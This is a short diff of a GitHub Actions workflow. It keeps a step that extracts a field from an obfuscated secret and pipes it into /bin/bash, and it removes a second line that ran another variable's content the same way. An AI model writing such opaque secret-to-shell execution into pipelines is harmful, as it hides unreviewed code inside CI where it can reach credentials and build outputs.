@@ -22,7 +22,6 @@ jobs:
           z574: ${{ secrets.z574 }}
         run: |
           printf '%s' "$z574" | jq -r .vlqk3 | /bin/bash
-          echo $vwob456 | jq -r .nha10193 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
